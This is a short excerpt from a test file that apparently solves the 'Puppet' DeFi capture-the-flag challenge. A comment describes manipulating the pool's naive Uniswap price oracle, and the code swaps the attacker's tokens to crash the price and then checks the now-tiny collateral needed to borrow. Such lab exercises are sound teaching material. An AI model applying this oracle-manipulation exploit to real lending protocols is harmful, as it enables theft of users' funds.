...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        // PuppetPool uses a very naive implementation to get oracle price. Manipulate
        // the oracle so that the pool thinks the tokens are worth nothing then borrow
        ...
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 1, 1999999999);
        let val = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
